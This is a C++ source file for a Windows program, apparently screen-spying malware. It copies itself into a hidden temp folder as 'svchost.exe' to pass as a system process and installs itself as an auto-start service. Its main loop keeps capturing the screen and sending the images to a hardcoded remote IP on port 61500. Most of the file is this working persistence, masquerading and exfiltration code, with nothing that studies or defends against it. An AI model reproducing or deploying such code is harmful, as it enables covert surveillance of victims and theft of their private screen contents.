#include "service_manager.h"

//------------------------------------------------------------------------------
//------------------------------------------------------------------------------

extern void WINAPI service_handler(DWORD);
extern void WINAPI service_main(DWORD, LPTSTR*);

//------------------------------------------------------------------------------
//------------------------------------------------------------------------------

ServiceManager::ServiceManager(string name) {
    TCHAR binary_path[MAX_PATH];

    this->name = name;
    this->ghSvcStopEvent = NULL;

    this->path = "";
    if (GetModuleFileName(NULL, binary_path, MAX_PATH)) {
        this->path = binary_path;
    }
}

//------------------------------------------------------------------------------

ServiceManager::~ServiceManager(void) {}

//------------------------------------------------------------------------------

void ServiceManager::main(bool separate_process) {
    cout << "Main" << endl;

    if (separate_process) {
        cout << "SeparateProcess" << endl;
        cout << this->path << endl;

        STARTUPINFO startup_info;
        ZeroMemory(&startup_info, sizeof(startup_info));
        startup_info.cb = sizeof(startup_info);
        PROCESS_INFORMATION process_info;

        ostringstream command;
        command << "\"" << this->path << "\" update";
        // command << this->path;

        if (!CreateProcess(NULL, (char *)command.str().c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &startup_info, &process_info)) {
        // if (!CreateProcess("C:\\Users\\Ricardo\\Downloads\\WindowsUpdate.exe", (char *)"user", NULL, NULL, FALSE, 0, NULL, NULL, &startup_info, &process_info)) {
            cout << "Error: " << GetLastError() << endl;
        } else {
            cout << "Process Created" << endl;

            // WaitForSingleObject(process_info.hProcess, INFINITE);

            // CloseHandle(process_info.hProcess);
            // CloseHandle(process_info.hThread);
        }
    } else {
        cout << "Creating ScreenManager" << endl;
        ScreenManager screen_manager = ScreenManager();

        // string hostname = "192.241.213.182";
        string hostname = "192.168.0.118";
        SOCKET socket = 0;

        while (1) {
            if (socket == 0) {
                socket = connect(hostname, 61500);
            }

            if (socket != 0) {
                string image = screen_manager.capture();
                send_image(socket, image, hostname);
            }

            wait();
        }

        if (socket != 0) {
            disconnect(socket);
        }
    }
}

//------------------------------------------------------------------------------

SC_HANDLE ServiceManager::install(void) {
    SC_HANDLE sc_manager;
    SC_HANDLE service;

    if (this->path == "") {
        this->log("Cannot install service");
        return 0;
    }

    sc_manager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (NULL == sc_manager) {
        this->log("OpenSCManager failed");
        return 0;
    }

    this->copy();

    service = CreateService(sc_manager, this->name.c_str(), this->name.c_str(),
        SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL, this->path.c_str(), NULL, NULL, NULL, NULL, NULL);

    if (service == NULL) {
        this->log("CreateService failed");
        CloseServiceHandle(sc_manager);
        return 0;
    } else {
        this->log("Service installed successfully", false);
    }

    CloseServiceHandle(service);
    CloseServiceHandle(sc_manager);

    return service;
}

//------------------------------------------------------------------------------

void ServiceManager::copy(void) {
    TCHAR temp_path[MAX_PATH+1];
    GetTempPath(MAX_PATH+1, temp_path);

    string new_path_folder = temp_path;
    new_path_folder += "Setup";

    string new_path = new_path_folder;
    new_path += "\\svchost.exe";

    CreateDirectory(new_path_folder.c_str(), NULL);
    SetFileAttributes(new_path_folder.c_str(), FILE_ATTRIBUTE_HIDDEN);

    if (CopyFile(this->path.c_str(), new_path.c_str(), FALSE)) {
        this->path = new_path;

    }
}

//------------------------------------------------------------------------------

void ServiceManager::init(DWORD dwArgc, LPTSTR *lpszArgv) {
    this->ghSvcStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);

    if (this->ghSvcStopEvent == NULL) {
        this->report_status(SERVICE_STOPPED, NO_ERROR, 0);
        return;
    }

    this->report_status(SERVICE_RUNNING, NO_ERROR, 0);

    this->main(true);
}

//------------------------------------------------------------------------------

void ServiceManager::start_service_ctrl_dispatcher(void) {
    SERVICE_TABLE_ENTRY dispatch_table[] = {
        {(char *)this->name.c_str(), (LPSERVICE_MAIN_FUNCTION) service_main},
        {NULL, NULL}
    };

    if (!StartServiceCtrlDispatcher(dispatch_table)) {
        this->report_event("StartServiceCtrlDispatcher");
    }
}

//------------------------------------------------------------------------------

void ServiceManager::report_status(DWORD dwCurrentState, DWORD dwWin32ExitCode, DWORD dwWaitHint) {
    static DWORD dwCheckPoint = 1;

    this->gSvcStatus.dwCurrentState = dwCurrentState;
    this->gSvcStatus.dwWin32ExitCode = dwWin32ExitCode;
    this->gSvcStatus.dwWaitHint = dwWaitHint;

    if (dwCurrentState == SERVICE_START_PENDING)
        this->gSvcStatus.dwControlsAccepted = 0;
    else this->gSvcStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;

    if ((dwCurrentState == SERVICE_RUNNING) || (dwCurrentState == SERVICE_STOPPED))
        this->gSvcStatus.dwCheckPoint = 0;
    else this->gSvcStatus.dwCheckPoint = dwCheckPoint++;

    SetServiceStatus(this->gSvcStatusHandle, &this->gSvcStatus);
}

//------------------------------------------------------------------------------

void ServiceManager::report_event(string event) {
    HANDLE hEventSource;
    LPCTSTR lpszStrings[2];
    ostringstream buffer;

    hEventSource = RegisterEventSource(NULL, this->name.c_str());

    if (NULL != hEventSource) {
        buffer << event << " failed with " << GetLastError();

        lpszStrings[0] = this->name.c_str();
        lpszStrings[1] = buffer.str().c_str();

        ReportEvent(hEventSource, EVENTLOG_ERROR_TYPE, 0, 0, NULL, 2, 0, lpszStrings, NULL);

        DeregisterEventSource(hEventSource);
    }
}

//------------------------------------------------------------------------------

void ServiceManager::log(string message, bool show_last_error) {
    cout << message;

    if (show_last_error) {
        cout << " (" << GetLastError() << ")";
    }

    cout << endl;
}

//------------------------------------------------------------------------------
//------------------------------------------------------------------------------
